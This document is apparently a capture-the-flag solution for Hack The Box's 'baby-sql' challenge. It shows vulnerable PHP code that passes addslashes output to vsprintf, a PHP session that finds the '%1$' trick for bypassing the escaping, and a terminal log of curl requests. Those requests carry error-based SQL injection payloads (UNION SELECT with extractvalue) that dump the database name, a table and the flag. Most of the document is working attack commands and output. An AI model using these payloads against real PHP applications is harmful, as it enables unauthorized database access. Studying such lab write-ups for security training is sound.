```php
 <?php require 'config.php';

class db extends Connection {
    public function query($sql) {
        $args = func_get_args();
        unset($args[0]);
        return parent::query(vsprintf($sql, $args));
    }
}

$db = new db();

if (isset($_POST['pass'])) {
    $pass = addslashes($_POST['pass']);
    $db->query("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin');
} else {
    die(highlight_file(__FILE__,1));
} 
```

### vsprintf
 ##format

    The format string is composed of zero or more directives: ordinary characters (excluding %) that are copied directly to the result and conversion specifications, each of which results in fetching its own parameter.

    A conversion specification follows this prototype: %[argnum$][flags][width][.precision]specifier. 

```
php -a            
Interactive mode enabled

php > echo vsprintf("SELECT * FROM users WHERE password=('test123') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('test123') AND username=('admin')
php > $pass = addslashes("pass'")
php > $pass = addslashes("pass'");
PHP Parse error:  syntax error, unexpected '$pass' (T_VARIABLE) in php shell code on line 2
php > echo $pass
php > $pass = addslashes("pass'")
php > echo $pass
php > echo $pass;
PHP Parse error:  syntax error, unexpected '$pass' (T_VARIABLE), expecting ';' or ',' in php shell code on line 2
php > echo $pass
php > $pass = addslashes("pass'");
PHP Parse error:  syntax error, unexpected '$pass' (T_VARIABLE), expecting ';' or ',' in php shell code on line 2
php > $pass = addslashes("pass'")
php > echo $pass
php > echo $pass;
PHP Parse error:  syntax error, unexpected 'echo' (T_ECHO) in php shell code on line 2
php > $pass = addslashes("pass'");
php > echo $pass;
pass\'
php > $pass = addslashes("shit'");
php > echo $pass;
shit\'
php > echo vsprintf("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('shit\'') AND username=('admin')
php > echo vsprintf("SELECT * FROM users WHERE password=('test123\'') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('test123\'') AND username=('admin')
php > echo vsprintf("SELECT * FROM users WHERE password=('test123%1$\'') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('test123'') AND username=('admin')
php > $pass = addslashes("shit%1$'");
php > echo $pass;
shit%1$\'
php > echo vsprintf("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin');
SELECT * FROM users WHERE password=('shit'') AND username=('admin')
php > 
```

```bash
curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$'"
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=admin%1$'"
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1   

┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 1#"
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 1--"
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=admin%1$'#"    
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 1--"
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 1#" 
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 2#"
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 3#"
Unknown column '3' in 'order clause'                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# nvim exploit.py                            
                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') extractvalue(0x0a,concat(0x0a,(select database())))--#"
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'extractvalue(0x0a,concat(0x0a,(select database())))--#') AND username=('admin')' at line 1                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select database())))--#"
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select database())))#"  
XPATH syntax error: '
db_m412'                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') extractvalue(0x0a,concat(0x0a,(select database())))#"  
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'extractvalue(0x0a,concat(0x0a,(select database())))#') AND username=('admin')' at line 1                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select database())))#"
XPATH syntax error: '
db_m412'                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1))))#"  
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ')#') AND username=('admin')' at line 1                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))#" 
XPATH syntax error: '
totally_not_a_flag'                                                                                                                      
┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select * from totally_not_a_flag)))#"
XPATH syntax error: '
HTB{h0w_d1d_y0u_f1nd_m3?}'                       

```
